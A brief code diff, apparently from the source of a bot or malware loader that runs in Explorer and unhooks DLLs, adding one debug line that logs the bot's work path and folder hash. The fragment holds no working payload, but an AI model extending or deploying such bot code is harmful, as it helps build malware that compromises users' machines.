@@ -171,7 +171,7 @@ DWORD WINAPI LoaderRoutine( LPVOID lpData )
 void ExplorerMain()
 {
 	MDBG("Main", "----------------- ExplorerMain -----------------");
-
+	MDBG("Main", "WorkPath %s  WorkPathHash %d", BOT::GetWorkPathInSysDrive() ,BOT::GetWorkFolderHash());
 
 	if ( !dwExplorerSelf )
 		UnhookDlls();
